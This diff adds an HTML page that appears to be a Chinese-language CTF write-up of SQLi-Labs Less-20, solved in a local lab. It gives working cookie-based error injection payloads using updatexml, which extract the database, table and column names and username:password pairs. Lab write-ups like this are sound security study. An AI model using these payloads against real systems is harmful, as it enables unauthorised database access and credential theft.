@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-20 Cookie 注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-20 Cookie 注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.25 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, POST注入, Cookie注入, 报错注入</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-20 (POST - Cookie injections - Uagent field - error based)</li>
+        <li><strong>提示：</strong>POST请求，Cookie 注入，基于报错</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    <p>本关卡的业务逻辑变化为使用 Cookie 维持登录状态。当用户登录成功后，服务器会下发一个 <code>uname=admin</code> 的 Cookie。后续刷新页面时，后台直接读取该 Cookie，并将其拼接入 SQL 语句（大概率为 <code>SELECT * FROM users WHERE username = '$cookie'</code>）以查询用户信息。</p>
+    <p>由于代码未对 Cookie 内容进行过滤，且查询结果会以报错形式回显，因此可以通过修改请求头中的 Cookie 字段进行报错注入。</p>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：登录获取 Cookie</strong></p>
+    <p>在登录框输入有效的账号密码（如 <code>admin/123456</code>），成功登录后，页面会明文显示当前的 Cookie 信息：<code>YOUR COOKIE : uname = admin</code>。</p>
+
+    <p><strong>第二步：抓取 GET 请求并测试闭合</strong></p>
+    <p>开启 Burp Suite 拦截，在浏览器中刷新页面。Burp 抓取到 GET 请求后，发送至 Repeater。
+    在请求头中找到 <code>Cookie</code> 字段，添加单引号进行闭合测试：</p>
+    <pre><code>Cookie: uname=admin'</code></pre>
+    <p>点击发送，右侧响应抛出 SQL 语法错误：<code>near '"admin"' LIMIT 0,1</code>。证明此处存在单引号字符型注入点。</p>
+
+    <p><strong>第三步：利用 updatexml 报错注入</strong></p>
+    <p>在 Cookie 中闭合单引号，并追加报错函数，使用 <code>#</code> 注释掉后续的 <code>and expires...</code> 等代码：</p>
+    <pre><code>Cookie: uname=admin' AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) #</code></pre>
+    <p><strong>回显：</strong><code>XPATH syntax error: '~security~'</code>。</p>
+
+    <p><strong>第四步：获取表名与列名</strong></p>
+    <p>查表名：</p>
+    <pre><code>Cookie: uname=admin' AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) #</code></pre>
+    <p>回显：<code>~emails,referrers,uagents,users~</code>。</p>
+    
+    <p>查列名（注意此处由于未限制库名，导致查出系统表列名）：</p>
+    <pre><code>Cookie: uname=admin' AND updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='users'), 0x7e), 1) #</code></pre>
+    <p>回显：<code>~USER,CURRENT_CONNECTIONS,TOTAL_...~</code>（发生跨库数据污染）。
+    <strong>修正 Payload：</strong>加上 <code>and table_schema='security'</code> 即可精准获取 <code>id,username,password</code>。</p>
+
+    <p><strong>第五步：提取最终数据</strong></p>
+    <p>由于报错注入有 32 字符限制，使用 <code>limit 0,1</code> 提取第一行数据：</p>
+    <pre><code>Cookie: uname=admin' AND updatexml(1, concat(0x7e, (select concat(username,0x3a,password) from users limit 0,1), 0x7e), 1) #</code></pre>
+    <p><strong>回显：</strong><code>XPATH syntax error: '~Dumb:Dumb~'</code>。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>Cookie 维持状态的机制：</strong>理解了 Web 登录状态维持的底层逻辑，即服务器信任客户端携带的 Cookie 数据并直接拼接入数据库，这是 Cookie 注入的根源。</li>
+        <li><strong>数据污染问题：</strong>在查 <code>information_schema.columns</code> 时，必须同时限定 <code>table_schema</code> 和 <code>table_name</code>。否则 MySQL 引擎会遍历所有库中同名表的结构，导致系统元数据被混入回显中。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>Cookie 注入：</strong>HTTP 头部注入的变种，由于后端盲目信任客户端传入的 Cookie 字段并直接执行 SQL 查询，导致攻击者可通过篡改 Cookie 实施注入。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
